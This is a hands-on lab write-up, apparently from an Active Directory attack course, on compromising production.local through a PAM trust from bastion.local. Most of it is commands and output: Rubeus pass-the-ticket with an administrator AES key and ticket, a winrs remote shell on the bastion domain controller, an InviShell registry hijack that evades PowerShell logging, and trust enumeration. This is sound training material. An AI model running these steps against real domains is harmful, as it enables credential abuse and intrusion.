# Hands-On 28:

```
Compromise production.local by abusing PAM trust between bastion.local and production.local
```
## Index of Content

  1.[Compromise production local](#compromise-production-local)
  
## Compromise production local

Enumeration of Privileges that could belong to DA of Administrator user of techcorp.local because the bastion.local it's a trust domain:

```
PS C:\Users\studentuser17> Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local | select -ExpandProperty Distinguishedname
CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-21-2781415573-3701854478-2406986946-500,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
```

```
PS C:\Users\studentuser17> Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}


DistinguishedName : CN=Administrators,CN=Builtin,DC=bastion,DC=local
GroupCategory     : Security
GroupScope        : DomainLocal
Member            : {CN=S-1-5-21-2781415573-3701854478-2406986946-500,CN=ForeignSecurityPrincipals,DC=bastion,DC=local,
                     CN=Domain Admins,CN=Users,DC=bastion,DC=local, CN=Enterprise Admins,CN=Users,DC=bastion,DC=local,
                    CN=Administrator,CN=Users,DC=bastion,DC=local}
Name              : Administrators
ObjectClass       : group
ObjectGUID        : 788f92b1-3806-4eef-bcaa-dd8111f45aa5
SamAccountName    : Administrators
SID               : S-1-5-32-544
```

Spawn a shell with Administrator user of techcorp.local tgt using rubeus from a high elevated privileges cmd console:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Showing process : True
[*] Username        : 8RQPLJ8M
[*] Domain          : HKSFAX5Q
[*] Password        : V1FIX1KZ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3564
[+] LUID            : 0xc00969a

[*] Using aes256_cts_hmac_sha1 hash: 58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
[*] Building AS-REQ (w/ preauth) for: 'techcorp.local\administrator'
[*] Target LUID : 201365146
[*] Using domain controller: 192.168.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[*] Target LUID: 0xc00969a
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/techcorp.local
  ServiceRealm             :  TECHCORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  TECHCORP.LOCAL
  StartTime                :  3/4/2023 12:46:51 PM
  EndTime                  :  3/4/2023 10:46:51 PM
  RenewTill                :  3/11/2023 12:46:51 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  rMisVsVN/5Up5RcKFjuHZpRpOH9ucODoZcS3b8fEy2M=
  ASREP (key)              :  58DB3C598315BF030D4F1F07021D364BA9350444E3F391E167938DD998836883
```
From the new terminal tray to authenticate the Adminsitor of the tchcorp.local:
```
C:\Windows\system32>winrs -r:bastion-dc.bastion.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECHCORP>hostname
hostname
Bastion-DC

C:\Users\Administrator.TECHCORP>whoami
whoami
techcorp\administrator

C:\Users\Administrator.TECHCORP>

```
Cupy and run invishell:
```
C:\Users\Public\RunWithRegistryNonAdmin.bat

C:\Users\Public>set COR_ENABLE_PROFILING=1

C:\Users\Public>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\InShellProf.dll" /f
The operation completed successfully.

C:\Users\Public>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

CHeck PAM Trust:

```
PS C:\Users\Public> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}


Direction               : Outbound
DisallowTransivity      : False
DistinguishedName       : CN=techcorp.local,CN=System,DC=bastion,DC=local
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : techcorp.local
ObjectClass             : trustedDomain
ObjectGUID              : 05498dce-bdab-4a88-946d-077d5dd0da16
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=bastion,DC=local
Target                  : techcorp.local
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : Inbound
DisallowTransivity      : False
DistinguishedName       : CN=production.local,CN=System,DC=bastion,DC=local
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : production.local
ObjectClass             : trustedDomain
ObjectGUID              : 3e0958ef-54c4-4afe-b4df-672150c1dbfc
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=bastion,DC=local
Target                  : production.local
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```
